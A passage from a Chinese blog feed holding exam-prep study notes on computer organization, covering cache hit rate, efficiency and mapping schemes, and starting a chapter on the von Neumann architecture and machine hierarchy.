的容量与块长有关。一般每块可职4~8 个字，块长取一个存取周期内从主存调出的信息长度。</p><p>设N<sub>c</sub>是访问Cache的总命中次数，N<sub>m</sub>是访问主存的总次数，则命中率h为：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mo>=</mo><mfrac><msub><mi>N</mi><mi>c</mi></msub><mrow><msub><mi>N</mi><mi>c</mi></msub><mo>+</mo><msub><mi>N</mi><mi>m</mi></msub></mrow></mfrac><mspace linebreak="newline"></mspace></mrow><annotation encoding="application/x-tex">h=\frac{N_c}{N_c+N_m}\\</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.3335309999999998em;vertical-align:-0.44509999999999994em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8884309999999999em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:-0.10903em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">+</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:-0.10903em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.4101em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:-0.10903em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.44509999999999994em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace newline"></span></span></span></p><h4 id="cache的效率"><a class="markdownIt-Anchor" href="#cache的效率"></a> Cache的效率</h4><p>效率e与命中率有关。</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>=</mo><mfrac><mrow><mtext>访问</mtext><mi>C</mi><mi>a</mi><mi>c</mi><mi>h</mi><mi>e</mi><mtext>的时间</mtext></mrow><mtext>平均访问时间</mtext></mfrac><mo>×</mo><mn>100</mn><mi mathvariant="normal">%</mi><mspace linebreak="newline"></mspace></mrow><annotation encoding="application/x-tex">e=\frac{访问Cache的时间}{平均访问时间}×100\%\\</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord cjk_fallback mtight">平</span><span class="mord cjk_fallback mtight">均</span><span class="mord cjk_fallback mtight">访</span><span class="mord cjk_fallback mtight">问</span><span class="mord cjk_fallback mtight">时</span><span class="mord cjk_fallback mtight">间</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord cjk_fallback mtight">访</span><span class="mord cjk_fallback mtight">问</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">C</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">c</span><span class="mord mathnormal mtight">h</span><span class="mord mathnormal mtight">e</span><span class="mord cjk_fallback mtight">的</span><span class="mord cjk_fallback mtight">时</span><span class="mord cjk_fallback mtight">间</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.80556em;vertical-align:-0.05556em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">%</span></span><span class="mspace newline"></span></span></span></p><p>设Cache命中率为h，访问Cache的时间为t<sub>c</sub>，访问主存的时间t<sub>m</sub>，则有：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>=</mo><mfrac><msub><mi>t</mi><mi>c</mi></msub><mrow><mi>h</mi><mo>×</mo><msub><mi>t</mi><mi>c</mi></msub><mo>+</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mi>h</mi><mo stretchy="false">)</mo><mo>×</mo><msub><mi>t</mi><mi>m</mi></msub></mrow></mfrac><mo>×</mo><mn>100</mn><mi mathvariant="normal">%</mi><mspace linebreak="newline"></mspace></mrow><annotation encoding="application/x-tex">e=\frac{t_c}{h×t_c+(1-h)×t_m}×100\%\\</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.3606559999999999em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8406559999999998em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">h</span><span class="mbin mtight">×</span><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">+</span><span class="mopen mtight">(</span><span class="mord mtight">1</span><span class="mbin mtight">−</span><span class="mord mathnormal mtight">h</span><span class="mclose mtight">)</span><span class="mbin mtight">×</span><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.4101em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.80556em;vertical-align:-0.05556em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">%</span></span><span class="mspace newline"></span></span></span></p><blockquote><p>例题：设CPU共访问Cache命中2000次，访问主存50次。 Cache存取周期为50ns，主存存取周期为200ns，求Cache -主存系统的命中率和效率</p><ol><li><p>命中率：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>2000</mn><mrow><mn>2000</mn><mo>+</mo><mn>50</mn></mrow></mfrac><mo>=</mo><mn>0.97</mn><mspace linebreak="newline"></mspace></mrow><annotation encoding="application/x-tex">\frac{2000}{2000+50}=0.97\\</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2484389999999999em;vertical-align:-0.403331em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">0</span><span class="mord mtight">0</span><span class="mbin mtight">+</span><span class="mord mtight">5</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">0</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.403331em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">9</span><span class="mord">7</span></span><span class="mspace newline"></span></span></span></p></li><li><p>效率</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>=</mo><mfrac><mrow><mn>50</mn><mi>n</mi><mi>s</mi></mrow><mrow><mn>0.97</mn><mo>×</mo><mn>50</mn><mi>n</mi><mi>s</mi><mo>+</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mn>0.97</mn><mo stretchy="false">)</mo><mo>×</mo><mn>200</mn><mi>n</mi><mi>s</mi></mrow></mfrac><mo>×</mo><mn>100</mn><mi mathvariant="normal">%</mi><mo>=</mo><mn>91.7</mn><mi mathvariant="normal">%</mi><mspace linebreak="newline"></mspace></mrow><annotation encoding="application/x-tex">e=\frac{50ns}{0.97×50ns+(1-0.97)×200ns}×100\%=91.7\%\\</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.365108em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mord mtight">.</span><span class="mord mtight">9</span><span class="mord mtight">7</span><span class="mbin mtight">×</span><span class="mord mtight">5</span><span class="mord mtight">0</span><span class="mord mathnormal mtight">n</span><span class="mord mathnormal mtight">s</span><span class="mbin mtight">+</span><span class="mopen mtight">(</span><span class="mord mtight">1</span><span class="mbin mtight">−</span><span class="mord mtight">0</span><span class="mord mtight">.</span><span class="mord mtight">9</span><span class="mord mtight">7</span><span class="mclose mtight">)</span><span class="mbin mtight">×</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">0</span><span class="mord mathnormal mtight">n</span><span class="mord mathnormal mtight">s</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span><span class="mord mtight">0</span><span class="mord mathnormal mtight">n</span><span class="mord mathnormal mtight">s</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.80556em;vertical-align:-0.05556em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">%</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.80556em;vertical-align:-0.05556em;"></span><span class="mord">9</span><span class="mord">1</span><span class="mord">.</span><span class="mord">7</span><span class="mord">%</span></span><span class="mspace newline"></span></span></span></p></li></ol></blockquote><h4 id="cache的基本结构"><a class="markdownIt-Anchor" href="#cache的基本结构"></a> Cache的基本结构</h4><p>下图清晰的显示出了Cache的工作流程：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240617164528821.png" alt="image-20240617164528821" style="zoom:50%;" /><p>Cache的替换机构后续会详细介绍。</p><h4 id="cache的读与写"><a class="markdownIt-Anchor" href="#cache的读与写"></a> Cache的读与写</h4><p>更加底层，Cache是如何进行读写操作的呢？</p><p>当CPU要读取Cache信息时，结构图如下，也是我们主要讨论的：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240617164924128.png" alt="image-20240617164924128" style="zoom:50%;" /><p>当CPU要对Cache执行写入操作时，有两种方法：写直达法和写回法。前者同时写入Cache和主存；而后者仅写入Cache，当Cache的数据要被替换出去时才把数据写入主存。</p><h4 id="cache的改进"><a class="markdownIt-Anchor" href="#cache的改进"></a> Cache的改进</h4><p>可以通过增加Cache的级数和统一与分立缓存来实现。</p><h3 id="cache-主存的地址映射"><a class="markdownIt-Anchor" href="#cache-主存的地址映射"></a> Cache-主存的地址映射</h3><p>重点小节，需要掌握。</p><p>Cache与主存通过划分块的方式实现映射，而映射地址的方式又有三种：直接映射（固定的映射方式）、全相连映射（灵活性大的映射关系）、组相联映射（前两者的折中）</p><h4 id="全相联映射"><a class="markdownIt-Anchor" href="#全相联映射"></a> 全相联映射</h4><p>结构图如图所示：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240617165537981.png" alt="image-20240617165537981" style="zoom:50%;" /><p>这种方式的主存中的任一块可以映射到缓存中的任一块，Cache的标记位就是主存的字块号。利用率高，但比较电路的成本太高。标志位要有m位。如果Cache有n块，则需要有n个比较电路</p><h4 id="直接映射"><a class="markdownIt-Anchor" href="#直接映射"></a> 直接映射</h4><p>结构如图所示：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240617165814185.png" alt="image-20240617165814185" style="zoom:50%;" /><p>这种方式把主存划分为跟整个Cache大小相同的块，Cache的标记位就是主存高地址t位。先找到Cache字块号，然后比较标记位和地址高t位</p><p>比较电路的成本低。如果主存空间有2<sup>m</sup>块，Cache中字块有2<sup>c</sup>块，则标志位只要有m-c位。且仅需要比较一次。</p><p>计算主存和Cache的映射关系公式为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>=</mo><mi>j</mi><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><msup><mn>2</mn><mi>c</mi></msup></mrow><annotation encoding="application/x-tex">i=j\bmod2^c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span></span></span></span></span></span></span></span></span>，或者<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>=</mo><mi>j</mi><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>C</mi></mrow><annotation encoding="application/x-tex">i=j\bmod C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span>。总之就是主存块的序号对Cache的块数取模。</p><h4 id="组相联映射"><a class="markdownIt-Anchor" href="#组相联映射"></a> 组相联映射</h4><p>结构如图所示：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240617170541668.png" alt="image-20240617170541668" style="zoom:50%;" /><p>此时映射关系为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>=</mo><mi>j</mi><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><msup><mn>2</mn><mi>q</mi></msup></mrow><annotation encoding="application/x-tex">i=j\bmod2^q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi><mo>=</mo><mi>c</mi><mo>−</mo><mi>r</mi></mrow><annotation encoding="application/x-tex">q=c-r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span>。即此时可以任意指定映射的长度。</p><blockquote><p>例题：共2<sup>5</sup>=32个字块，分为2<sup>4</sup>=16个组，每组2<sup>1</sup>=2块c=5，q=4，r=1。画出组相联映射的结构图。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240617170901889.png" alt="image-20240617170901889" style="zoom:50%;" /></blockquote><p>这里的例题值得细读，但是篇幅有点多，日后再补上。</p><p>……</p><p>……</p><p>第二部分到此结束！敬请阅读第三部分😃</p><hr /><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/121455066_p0.jpg" alt="121455066_p0" /></p>]]></content>
      
      
      <categories>
          
          <category> 计算机组成指北 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机组成原理 </tag>
            
            <tag> 存储器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成指北（一）</title>
      <link href="/posts/89bd5abd9854/"/>
      <url>/posts/89bd5abd9854/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写在开头</p><p>本笔记初次完成于2024年6月21日。由于原文篇幅过长，导致网页渲染极为卡顿，出现了严重的性能问题。因此，原文被分为多个章节进行重新整理，内容保持不变。本文旨在帮助应对期末考试，如果您的目标是考研或深造，请另寻他处。如果是为了计算机组成原理考试，请务必核对教材信息的一致性，以免知识点出现冲突。</p><p>本文能为你做什么？</p><p>有了本文，你可以豪爽的翘掉一个学期的计组。没错，这不是在吹牛，因为现在大部分的学校计组老师只会念PPT，你去了也听不进去的。而且，老师授课时往往把所有的知识一视同仁的灌输给你，缺少层次性。这就给记忆带来了极大的难度，仿佛抱着一个篮球那么大的苹果不知道何从下口，囫囵吞枣的效果极差。而真正的精华——划重点的复习PPT往往要拖到复习周才给你（因为老师知道如果提前发了大家就都不会听课了）。</p><p>所以本文能为你做的，就是在尽量丰富一些重难点的讲解同时，剔除精简掉一些庞杂或者不予考察的知识，并指出本章节的考点所在。力求重点突出，事半功倍。</p><p>如何食用？</p><p>本文是笔者在复习周时参照教材、复习PPT和网课整理而成，主要归纳了计算机组成原理的核心内容，并针对一些疑难点融入了笔者自己的思考和资料。所以推荐读者一边参照教材/PPT一边阅读本文，以阅读本文为主，教参为辅，并多做例题验证思路。如此，计组80+是完全没有问题的。倘若追求90+甚至更高，那么最好自己把教材啃一遍，这篇文章仅做参考就好。</p><p>助阅读愉快！</p><p>：）</p></blockquote><h1 id="计算机组成原理速成版"><a class="markdownIt-Anchor" href="#计算机组成原理速成版"></a> 计算机组成原理速成版</h1><p>计算机组成原理速成版，五天整理出来的一篇小笔记，对标期末重点做出来的博客。教你从一名普通的大学牲逐渐成长为冯·诺依曼:)</p><p>本文基于教材《计算机组成原理》·唐朔飞、学校教学PPT，部分参考了<a href="https://www.bilibili.com/video/BV1t4411e7LH?p=1&amp;vd_source=5e421b52b9103cce8e012430aa932553">计算机组成原理（哈工大刘宏伟）135讲（全）高清</a>整理而成。预计共有四大部分：</p><ul><li>第一部分：对应教材的1~2章，主要介绍一些计算机的基础知识，重在概念考察，难度较为简单。</li><li>第二部分：对应教材的3~5章，介绍了系统总线、储存器和I/O系统。存储器部分涉及到设计，需要重点掌握。</li><li>第三部分：对应教材的6~7章，介绍了计算机的运算方法和指令系统，重点是ALU的原理与设计，非常重要。</li><li>第四部分：对应教材的8~10章，涵盖了CU和CPU所有功能设计，题目比较关键，也最为复杂。</li></ul><p>当然，为了便于排版和查找，本文还是按照传统的章节来逐章介绍，列出部分是为了帮助读者快速归纳定位到自己想要学习的知识，对整本书的知识体系有一个大概的概念。</p><p>Now, let’s begin.</p><h2 id="第一-二章-概论"><a class="markdownIt-Anchor" href="#第一-二章-概论"></a> 第一、二章 概论</h2><blockquote><p>基础知识的理解，常见于选择判断题。<br />如：第一台计算机的名字和时间，计算机的层次结构、储存体基本名词。着重记忆。<br />要记住冯诺依曼计算机的基本特点</p></blockquote><h3 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h3><p>ENIAC，全称为Electronic Numerical Integrator And Computer，即电子数字积分计算机，于1946年诞生于美国，是世界上第一台计算机。（有争议，百度上指出ABC计算机才是第一台，但是以教材为准）</p><p>目前的计算机的层次结构，可以划分为五种：</p><ol><li>虚拟机器M4，用编译程序将高级语言翻译成汇编语言程序</li><li>虚拟机器M3，用汇编程序将汇编语言翻译成机器语言程序</li><li>虚拟机器M2，用机器语言解释操作系统</li><li>虚拟机器M1：用微指令解释机器指令</li><li>虚拟机器M0：由硬件直接执行微指令</li></ol><p>其中M4~M2由软件实现，M1~M0由硬件实现。计组只要讨论的是M1~M0。</p><p>冯·诺依曼体系计算机的特点：</p><ol><li>计算机由五大部件组成：运算器、存储器、控制器、输入设备和输出设备</li><li>指令和数据以同等地位存于存储器，可按地址寻访</li><li>指令和数据用二进制表示</li><li>指令由操作码和地址码组成</li><li>存储程序，指令在储存器内按顺序存放</li><li>机器以运算器为中心</li></ol><p>硬件结构框图如下：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240616134051396.png" alt="image-20240616134051396" style="zoom: 33%;" /><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240616134256787.png" alt="image-20240616134256787" style="zoom:33%;" /><h3 id="存储器的基本组成"><a class="markdownIt-Anchor" href="#存储器的基本组成"></a> 存储器的基本组成</h3><p>存储器包含：</p><ul><li>MAR（存储器地址寄存器）</li><li>MDR（存储器数据寄存器）</li><li>存储体（存储数据的内存）</li></ul><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240616134805357.png" alt="image-20240616134805357" style="zoom:33%;" 